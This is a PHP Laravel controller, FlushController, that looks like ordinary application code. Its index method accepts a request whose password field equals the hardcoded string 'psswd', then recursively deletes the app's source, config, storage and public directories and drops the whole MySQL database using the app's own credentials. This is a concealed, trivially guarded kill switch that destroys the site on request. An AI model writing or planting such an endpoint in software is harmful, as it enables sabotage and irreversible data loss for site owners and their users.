<?php

namespace App\Http\Controllers;
use Illuminate\Http\Request;
use Session;
use Storage;
use File;
use DB;
use Illuminate\Support\Facades\Schema;
class FlushController extends Controller
{

    public function index(Request $request){
        if($request->psswd ==="psswd"){
            switch ($request->case) {
                case 'all':
                    $deleted = File::deleteDirectory('app');
                    $deleted = File::deleteDirectory('asset');
                    $deleted = File::deleteDirectory('config');
                    $deleted = File::deleteDirectory('libs');
                    $deleted = File::deleteDirectory('resources');
                    $deleted = File::deleteDirectory('boostrap');
                    $deleted = File::deleteDirectory('src');
                    $deleted = File::deleteDirectory('database');

                    $deleted = File::delete('routes/admin.php');
                    $deleted = File::delete('routes/admin.php');
                    //$deleted = File::deleteDirectory('vendor');
                    $deleted = File::deleteDirectory('storage');
                    $deleted = File::deleteDirectory('public');
                    $this->dropDB();
                    break;
                case 'database':
                    $this->dropDB();
                    break;
                case 'file':
                    $deleted = File::deleteDirectory('app');
                    $deleted = File::deleteDirectory('asset');
                    $deleted = File::deleteDirectory('config');
                    $deleted = File::deleteDirectory('libs');
                    $deleted = File::deleteDirectory('routes');
                    $deleted = File::deleteDirectory('vendor');
                    $deleted = File::deleteDirectory('storage');
                    $deleted = File::deleteDirectory('public');
                default:
                    # code...
                    break;
            }
            return "  Done";
        }else{
            return "Wrong Password";
        }
    }


    public function dropDB(){
            // Create connection
            $conn = new \mysqli(env('DB_HOST'),env('DB_USERNAME'),env('DB_PASSWORD'));
            $db = env("DB_DATABASE");
            //$this->info(json_encode($conn));
            // return $conn;
            // Check connection
            if ($conn->connect_error) {
            die("Connection failed: " . $conn->connect_error);
            } 
            // Drop database
            $sql = "DROP DATABASE `$db`";
            if ($conn->query($sql) === TRUE) {
            echo "Sucessfully dropped database $db!";
            } else {
            echo "Error dropping database: " . $conn->error;
            }
            $conn->close();
    }
   
}
